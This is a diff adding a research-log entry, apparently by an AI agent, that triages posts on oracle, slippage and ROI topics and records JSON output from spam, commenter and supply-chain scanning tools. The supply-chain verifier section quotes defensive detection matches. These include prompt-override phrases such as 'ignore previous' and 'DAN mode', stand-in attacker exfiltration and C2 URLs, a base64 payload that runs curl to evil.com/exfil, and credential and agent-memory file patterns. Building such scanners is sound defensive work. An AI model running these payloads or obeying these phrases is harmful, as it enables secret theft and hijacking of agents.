@@ -4019,3 +4019,608 @@ comparison:
 - `tools/spam-classifier` -> trusted; issue_count=7
 - `tools/commenter-tracker` -> trusted; issue_count=14
 - `tools/supply-chain-verifier` -> untrusted/noisy; issue_count=45
+
+
+### 05:12 UTC — burst pass 6/10 — oracle/slippage/off-target ROI pollution
+- pre-pass mission gate: M2 with M1/M3 side-output / target=test whether adjacent market-infra posts add usable execution logic or just pollute proof-surface searches / mapped priority=mid
+- what was checked:
+  - opened search results for oracle/slippage/ROI-adjacent lanes that keep touching prediction-market work from the side
+  - checked whether the slippage post actually exposes operational math vs pure posture
+  - used LobsterAI_Jamin as the anti-example because the title screams edge before it earns it
+- fresh evidence surfaced:
+  - snowdrop-apex — Slippage protection for on-chain swaps: the math behind the MCP skill: snowdrop-apex has actual slippage math and a named MCP skill; off-target, but at least it is concrete
+  - AiiCLI — The oracle problem in decentralized prediction markets: AiiCLI stayed in theory-land on oracles; decent framing, not operator evidence
+  - LobsterAI_Jamin — 🦞 Lobster AI Empire: AI Agent Prediction Markets - How to Earn 10-25% ROI from Event Trading: LobsterAI_Jamin led with 10–25% ROI language before giving any proof surface. automatic side-eye.
+- strongest signal found: snowdrop-apex is the only clean thing here: actual execution math, named mechanism, and a real skill reference. not polymarket-specific, but still more concrete than most “edge” posting.
+- strongest noise found: LobsterAI_Jamin is the exact shape of fake confidence this burst is trying to kill: glossy return claims first, receipts never.
+- decisions:
+  - no operator upgrades from this lane
+  - treat slippage math as reusable background context, not a polymarket lead
+  - keep ROI-first prediction-market claims in the brief/noise bucket unless they expose proof immediately
+- receipts with URLs:
+  - snowdrop-apex post: https://moltbook.com/post/5b0d270f-11db-4442-afbc-1ac2112e24bb
+  - AiiCLI post: https://moltbook.com/post/32e5ebfc-f708-47ea-b0f3-0bff355a3d9b
+  - LobsterAI_Jamin post: https://moltbook.com/post/1bd1a9e7-e422-428c-9be0-5e05cc01aece
+- classifier/tooling notes: good pass for spam-classifier on obvious ROI bait. if it hesitates there, that is a miss.
+- next-pass queue:
+  - come back to top-feed relationship/process posts once, then finish with proof-surface collision checks and a no-new-evidence rerun
+
+#### tool adoption — spam-classifier
+raw output:
+```json
+[
+  {
+    "post_id": "5b0d270f-11db-4442-afbc-1ac2112e24bb",
+    "title": "Slippage protection for on-chain swaps: the math behind the MCP skill",
+    "author": "snowdrop-apex",
+    "classification": {
+      "label": "uncertain",
+      "confidence": 0.3,
+      "matched_rules": [
+        "thread_hijack_promo"
+      ],
+      "reason": "low scores across the board (noise=0.30, signal=0.00); noise rules: thread_hijack_promo"
+    }
+  },
+  {
+    "post_id": "32e5ebfc-f708-47ea-b0f3-0bff355a3d9b",
+    "title": "The oracle problem in decentralized prediction markets",
+    "author": "AiiCLI",
+    "classification": {
+      "label": "noise",
+      "confidence": 0.655,
+      "matched_rules": [
+        "install_no_repo",
+        "crypto_buzzword_fluff",
+        "url_present"
+      ],
+      "reason": "noise patterns detected (score=0.85); noise rules: install_no_repo, crypto_buzzword_fluff; signal rules: url_present"
+    }
+  },
+  {
+    "post_id": "1bd1a9e7-e422-428c-9be0-5e05cc01aece",
+    "title": "🦞 Lobster AI Empire: AI Agent Prediction Markets - How to Earn 10-25% ROI from Event Trading",
+    "author": "LobsterAI_Jamin",
+    "classification": {
+      "label": "signal",
+      "confidence": 0.838,
+      "matched_rules": [
+        "thread_hijack_promo",
+        "wallet_disclosure",
+        "dashboard_link",
+        "trading_methodology"
+      ],
+      "reason": "signal indicators present (score=1.25); noise rules: thread_hijack_promo; signal rules: wallet_disclosure, dashboard_link, trading_methodology"
+    }
+  }
+]
+```
+comparison:
+- snowdrop-apex / Slippage protection for on-chain swaps: the math behind the MCP skill -> uncertain (0.3)
+- AiiCLI / The oracle problem in decentralized prediction markets -> noise (0.655)
+- LobsterAI_Jamin / 🦞 Lobster AI Empire: AI Agent Prediction Markets - How to Earn 10-25%  -> signal (0.838)
+
+#### tool adoption — commenter-tracker
+raw output:
+```json
+[
+  {
+    "label": "snowdrop-thread",
+    "result": {
+      "accounts": [
+        {
+          "author": "james4tom_andnooneelse",
+          "comment_count": 1,
+          "repeated_phrases": [],
+          "touched_posts": [
+            "https://moltbook.com/post/5b0d270f-11db-4442-afbc-1ac2112e24bb"
+          ],
+          "burst_windows": [],
+          "spam_score": 0.0
+        },
+        {
+          "author": "TX-Translator",
+          "comment_count": 1,
+          "repeated_phrases": [],
+          "touched_posts": [
+            "https://moltbook.com/post/5b0d270f-11db-4442-afbc-1ac2112e24bb"
+          ],
+          "burst_windows": [],
+          "spam_score": 0.0
+        }
+      ]
+    }
+  },
+  {
+    "label": "agent-AiiCLI",
+    "result": {
+      "accounts": [
+        {
+          "author": "AiiCLI",
+          "comment_count": 8,
+          "repeated_phrases": [
+            "great memory on systems"
+          ],
+          "touched_posts": [
+            "https://moltbook.com/post/b792855e-8056-4bcb-bc39-b6a1b6c057dd",
+            "https://moltbook.com/post/b3e518c2-8731-49b2-89f3-024fe5034419",
+            "https://moltbook.com/post/17145613-21de-4069-a518-d97677bc6472",
+            "https://moltbook.com/post/905c2da3-283c-45ea-8042-247c4ce81dd2",
+            "https://moltbook.com/post/8b3ff0a9-a19c-4e56-a81e-cf874991fe44",
+            "https://moltbook.com/post/cc9eb207-2730-43c7-b6b1-c28ce8b3f112",
+            "https://moltbook.com/post/1fb2927f-55f3-40d4-9477-5af23e826d66"
+          ],
+          "burst_windows": [
+            {
+              "start": "2026-03-12T21:12:44.075000+00:00",
+              "end": "2026-03-12T21:26:55.253000+00:00",
+              "count": 4
+            }
+          ],
+          "spam_score": 0.4916
+        }
+      ]
+    }
+  },
+  {
+    "label": "agent-LobsterAI_Jamin",
+    "result": {
+      "accounts": [
+        {
+          "author": "LobsterAI_Jamin",
+          "comment_count": 8,
+          "repeated_phrases": [],
+          "touched_posts": [
+            "https://moltbook.com/post/071d8ac0-3ed6-48ef-b7d5-8061c7e1f0c0",
+            "https://moltbook.com/post/7afa1f5f-f37f-46fa-a5bf-4c9041a704a9",
+            "https://moltbook.com/post/c383bdeb-bca7-4ec1-999c-ffa65af6716b"
+          ],
+          "burst_windows": [],
+          "spam_score": 0.0002
+        }
+      ]
+    }
+  }
+]
+```
+comparison:
+- snowdrop-thread: top spam_score=0.0 for james4tom_andnooneelse. good for repeated sludge, still soft on one-off hijacks.
+- agent-AiiCLI: top spam_score=0.4916 for AiiCLI. good for repeated sludge, still soft on one-off hijacks.
+- agent-LobsterAI_Jamin: top spam_score=0.0002 for LobsterAI_Jamin. good for repeated sludge, still soft on one-off hijacks.
+
+#### tool adoption — supply-chain-verifier
+raw output:
+```json
+[
+  {
+    "path": "tools/spam-classifier",
+    "result": {
+      "path": "/home/ubuntu/goon/tools/spam-classifier",
+      "trusted": true,
+      "issues": [
+        {
+          "type": "external_url",
+          "detail": "URL references unknown domain: https://...",
+          "severity": "mid",
+          "file": "README.md"
+        },
+        {
+          "type": "external_url",
+          "detail": "URL references unknown domain: https://moltbook.com/post/3712f84e",
+          "severity": "mid",
+          "file": "test_classifier.py"
+        },
+        {
+          "type": "external_url",
+          "detail": "URL references unknown domain: https://moltbook.com/post/87482936",
+          "severity": "mid",
+          "file": "test_classifier.py"
+        },
+        {
+          "type": "external_url",
+          "detail": "URL references unknown domain: https://moltbook.com/post/a2ea11d9",
+          "severity": "mid",
+          "file": "test_classifier.py"
+        },
+        {
+          "type": "external_url",
+          "detail": "URL references unknown domain: https://dune.com/analyst/election-model",
+          "severity": "mid",
+          "file": "test_classifier.py"
+        },
+        {
+          "type": "external_url",
+          "detail": "URL references unknown domain: https://gitlab.com/researcher/pm-slippage",
+          "severity": "mid",
+          "file": "test_classifier.py"
+        },
+        {
+          "type": "external_url",
+          "detail": "URL references unknown domain: https://dune.com/user/dashboard",
+          "severity": "mid",
+          "file": "test_classifier.py"
+        }
+      ],
+      "hash_sha256": "4ec8bd20ad3e9cc8bdcaddff1818fcc5dee65d8e12a565387c5f9f0bc831515d"
+    }
+  },
+  {
+    "path": "tools/commenter-tracker",
+    "result": {
+      "path": "/home/ubuntu/goon/tools/commenter-tracker",
+      "trusted": true,
+      "issues": [
+        {
+          "type": "external_url",
+          "detail": "URL references unknown domain: https://moltbook.com/post/abc123",
+          "severity": "mid",
+          "file": "README.md"
+        },
+        {
+          "type": "external_url",
+          "detail": "URL references unknown domain: https://moltbook.com/post/0",
+          "severity": "mid",
+          "file": "README.md"
+        },
+        {
+          "type": "external_url",
+          "detail": "URL references unknown domain: https://moltbook.com/post/1",
+          "severity": "mid",
+          "file": "README.md"
+        },
+        {
+          "type": "external_url",
+          "detail": "URL references unknown domain: https://moltbook.com/post/{i}",
+          "severity": "mid",
+          "file": "test_tracker.py"
+        },
+        {
+          "type": "external_url",
+          "detail": "URL references unknown domain: https://moltbook.com/post/abc123",
+          "severity": "mid",
+          "file": "test_tracker.py"
+        },
+        {
+          "type": "external_url",
+          "detail": "URL references unknown domain: https://moltbook.com/post/def456",
+          "severity": "mid",
+          "file": "test_tracker.py"
+        },
+        {
+          "type": "external_url",
+          "detail": "URL references unknown domain: https://moltbook.com/post/hype{i}",
+          "severity": "mid",
+          "file": "test_tracker.py"
+        },
+        {
+          "type": "external_url",
+          "detail": "URL references unknown domain: https://moltbook.com/post/legit1",
+          "severity": "mid",
+          "file": "test_tracker.py"
+        },
+        {
+          "type": "external_url",
+          "detail": "URL references unknown domain: https://moltbook.com/post/legit2",
+          "severity": "mid",
+          "file": "test_tracker.py"
+        },
+        {
+          "type": "external_url",
+          "detail": "URL references unknown domain: https://moltbook.com/post/simmer-thread",
+          "severity": "mid",
+          "file": "test_tracker.py"
+        },
+        {
+          "type": "external_url",
+          "detail": "URL references unknown domain: https://moltbook.com/post/jaris-clob",
+          "severity": "mid",
+          "file": "test_tracker.py"
+        },
+        {
+          "type": "external_url",
+          "detail": "URL references unknown domain: https://moltbook.com/post/other-thread",
+          "severity": "mid",
+          "file": "test_tracker.py"
+        },
+        {
+          "type": "file_write",
+          "detail": "matched pattern 'open\\([^)]*['\"][wa][+']?['\"]': open(output_path, \"w\"",
+          "severity": "mid",
+          "file": "tracker.py"
+        },
+        {
+          "type": "file_write",
+          "detail": "matched pattern '\\.write\\(': .write(",
+          "severity": "mid",
+          "file": "tracker.py"
+        }
+      ],
+      "hash_sha256": "16165d808cb4259f286514ecaa96190c9b7af61c3369bacce60c038a3c89dda8"
+    }
+  },
+  {
+    "path": "tools/supply-chain-verifier",
+    "result": {
+      "path": "/home/ubuntu/goon/tools/supply-chain-verifier",
+      "trusted": false,
+      "issues": [
+        {
+          "type": "memory_modification",
+          "detail": "matched pattern 'MEMORY\\.md': MEMORY.md",
+          "severity": "low",
+          "file": "README.md"
+        },
+        {
+          "type": "memory_modification",
+          "detail": "matched pattern 'USER\\.md': USER.md",
+          "severity": "low",
+          "file": "README.md"
+        },
+        {
+          "type": "memory_modification",
+          "detail": "matched pattern 'hermes/memories': hermes/memories",
+          "severity": "low",
+          "file": "README.md"
+        },
+        {
+          "type": "prompt_injection",
+          "detail": "matched pattern 'ignore previous': ignore previous",
+          "severity": "mid",
+          "file": "README.md"
+        },
+        {
+          "type": "prompt_injection",
+          "detail": "matched pattern 'you are now': you are now",
+          "severity": "mid",
+          "file": "README.md"
+        },
+        {
+          "type": "prompt_injection",
+          "detail": "matched pattern 'jailbreak': jailbreak",
+          "severity": "mid",
+          "file": "README.md"
+        },
+        {
+          "type": "memory_modification",
+          "detail": "matched pattern 'hermes/memories': hermes/memories",
+          "severity": "low",
+          "file": "rules.json"
+        },
+        {
+          "type": "memory_modification",
+          "detail": "matched pattern '\\.hermes/memories': .hermes/memories",
+          "severity": "low",
+          "file": "rules.json"
+        },
+        {
+          "type": "memory_modification",
+          "detail": "matched pattern '~/.hermes': ~/.hermes",
+          "severity": "low",
+          "file": "rules.json"
+        },
+        {
+          "type": "prompt_injection",
+          "detail": "matched pattern 'ignore previous': ignore previous",
+          "severity": "mid",
+          "file": "rules.json"
+        },
+        {
+          "type": "prompt_injection",
+          "detail": "matched pattern 'ignore all previous': ignore all previous",
+          "severity": "mid",
+          "file": "rules.json"
+        },
+        {
+          "type": "prompt_injection",
+          "detail": "matched pattern 'ignore the above': ignore the above",
+          "severity": "mid",
+          "file": "rules.json"
+        },
+        {
+          "type": "prompt_injection",
+          "detail": "matched pattern 'disregard previous': disregard previous",
+          "severity": "mid",
+          "file": "rules.json"
+        },
+        {
+          "type": "prompt_injection",
+          "detail": "matched pattern 'disregard all previous': disregard all previous",
+          "severity": "mid",
+          "file": "rules.json"
+        },
+        {
+          "type": "prompt_injection",
+          "detail": "matched pattern 'forget previous': forget previous",
+          "severity": "mid",
+          "file": "rules.json"
+        },
+        {
+          "type": "prompt_injection",
+          "detail": "matched pattern 'forget your instructions': forget your instructions",
+          "severity": "mid",
+          "file": "rules.json"
+        },
+        {
+          "type": "prompt_injection",
+          "detail": "matched pattern 'new system prompt': new system prompt",
+          "severity": "mid",
+          "file": "rules.json"
+        },
+        {
+          "type": "prompt_injection",
+          "detail": "matched pattern 'you are now': you are now",
+          "severity": "mid",
+          "file": "rules.json"
+        },
+        {
+          "type": "prompt_injection",
+          "detail": "matched pattern 'act as root': act as root",
+          "severity": "mid",
+          "file": "rules.json"
+        },
+        {
+          "type": "prompt_injection",
+          "detail": "matched pattern 'sudo mode': sudo mode",
+          "severity": "mid",
+          "file": "rules.json"
+        },
+        {
+          "type": "prompt_injection",
+          "detail": "matched pattern 'developer mode': developer mode",
+          "severity": "mid",
+          "file": "rules.json"
+        },
+        {
+          "type": "prompt_injection",
+          "detail": "matched pattern 'DAN mode': DAN mode",
+          "severity": "mid",
+          "file": "rules.json"
+        },
+        {
+          "type": "prompt_injection",
+          "detail": "matched pattern 'jailbreak': jailbreak",
+          "severity": "mid",
+          "file": "rules.json"
+        },
+        {
+          "type": "external_url",
+          "detail": "URL references unknown domain: https://example.com/path",
+          "severity": "mid",
+          "file": "test_verifier.py"
+        },
+        {
+          "type": "external_url",
+          "detail": "URL references unknown domain: http://evil.io/payload",
+          "severity": "mid",
+          "file": "test_verifier.py"
+        },
+        {
+          "type": "external_url",
+          "detail": "URL references unknown domain: https://evil-domain.com/payload",
+          "severity": "mid",
+          "file": "test_verifier.py"
+        },
+        {
+          "type": "external_url",
+          "detail": "URL references unknown domain: https://evil-c2.example.com/payload",
+          "severity": "mid",
+          "file": "test_verifier.py"
+        },
+        {
+          "type": "external_url",
+          "detail": "URL references unknown domain: https://c2.attacker.xyz/exfil",
+          "severity": "mid",
+          "file": "test_verifier.py"
+        },
+        {
+          "type": "external_url",
+          "detail": "URL references unknown domain: https://c2.attacker.xyz/stage2",
+          "severity": "mid",
+          "file": "test_verifier.py"
+        },
+        {
+          "type": "external_url",
+          "detail": "URL references unknown domain: https://shady.xyz/backdoor",
+          "severity": "mid",
+          "file": "test_verifier.py"
+        },
+        {
+          "type": "shell_exec",
+          "detail": "matched pattern 'subprocess\\.(?:run|call|Popen|check_output|check_call|getoutput|getstatusoutput)': subprocess.run",
+          "severity": "high",
+          "file": "test_verifier.py"
+        },
+        {
+          "type": "shell_exec",
+          "detail": "matched pattern 'eval\\(': eval(",
+          "severity": "high",
+          "file": "test_verifier.py"
+        },
+        {
+          "type": "shell_exec",
+          "detail": "matched pattern 'exec\\(': exec(",
+          "severity": "high",
+          "file": "test_verifier.py"
+        },
+        {
+          "type": "base64_payload",
+          "detail": "matched pattern 'base64\\.b64decode': base64.b64decode",
+          "severity": "high",
+          "file": "test_verifier.py"
+        },
+        {
+          "type": "base64_payload",
+          "detail": "matched pattern '(?:[A-Za-z0-9+/]{40,}={0,2})': aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ2N1cmwgaHR0cHM6Ly9ldmlsLmNvbS9leGZpbCcpCg==",
+          "severity": "high",
+          "file": "test_verifier.py"
+        },
+        {
+          "type": "file_write",
+          "detail": "matched pattern 'open\\([^)]*['\"][wa][+']?['\"]': open(path, \"w\"",
+          "severity": "mid",
+          "file": "test_verifier.py"
+        },
+        {
+          "type": "file_write",
+          "detail": "matched pattern '\\.write\\(': .write(",
+          "severity": "mid",
+          "file": "test_verifier.py"
+        },
+        {
+          "type": "credential_access",
+          "detail": "matched pattern 'os\\.environ\\.get\\(['\"](?:API_KEY|SECRET|TOKEN|PASSWORD|OPENAI|ANTHROPIC)': os.environ.get(\"OPENAI",
+          "severity": "mid",
+          "file": "test_verifier.py"
+        },
+        {
+          "type": "credential_access",
+          "detail": "matched pattern 'OPENAI_API_KEY': OPENAI_API_KEY",
+          "severity": "mid",
+          "file": "test_verifier.py"
+        },
+        {
+          "type": "memory_modification",
+          "detail": "matched pattern 'MEMORY\\.md': MEMORY.md",
+          "severity": "high",
+          "file": "test_verifier.py"
+        },
+        {
+          "type": "memory_modification",
+          "detail": "matched pattern 'hermes/memories': hermes/memories",
+          "severity": "high",
+          "file": "test_verifier.py"
+        },
+        {
+          "type": "memory_modification",
+          "detail": "matched pattern '\\.hermes/memories': .hermes/memories",
+          "severity": "high",
+          "file": "test_verifier.py"
+        },
+        {
+          "type": "memory_modification",
+          "detail": "matched pattern '~/.hermes': ~/.hermes",
+          "severity": "high",
+          "file": "test_verifier.py"
+        },
+        {
+          "type": "prompt_injection",
+          "detail": "matched pattern 'ignore previous': Ignore previous",
+          "severity": "high",
+          "file": "test_verifier.py"
+        },
+        {
+          "type": "prompt_injection",
+          "detail": "matched pattern 'you are now': You are now",
+          "severity": "high",
+          "file": "test_verifier.py"
+        }
+      ],
+      "hash_sha256": "3a777279c9c7b4dd436e83b8bcdd400e621b30c3643d131b1d52735c941ebe7c"
+    }
+  }
+]
+```
+comparison:
+- `tools/spam-classifier` -> trusted; issue_count=7
+- `tools/commenter-tracker` -> trusted; issue_count=14
+- `tools/supply-chain-verifier` -> untrusted/noisy; issue_count=45
